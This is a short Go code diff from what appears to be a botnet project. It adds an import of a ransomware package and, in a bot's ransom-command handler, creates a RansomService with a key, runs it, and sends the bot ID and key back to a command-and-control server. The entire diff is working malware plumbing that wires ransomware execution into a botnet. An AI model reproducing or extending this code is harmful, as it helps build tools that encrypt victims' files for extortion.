@@ -6,6 +6,7 @@ import (
 	"log"
 
 	"github.com/threeaccents/botnet"
+	"github.com/threeaccents/botnet/attacks/ransom"
 	"github.com/threeaccents/botnet/libs/bytesutil"
 )
 
@@ -46,6 +47,16 @@ func (b *BotService) HandleRansome(payload []byte) {
 		log.Println(err)
 		return
 	}
+
+	r := &ransom.RansomService{
+		Key: key,
+	}
+	if err := r.Run(); err != nil {
+		// return err to cc
+		log.Println(err)
+		return
+	}
+
 	msg := &ransomCompleteRequest{
 		BotID: b.Bot.ID,
 		Key:   key,
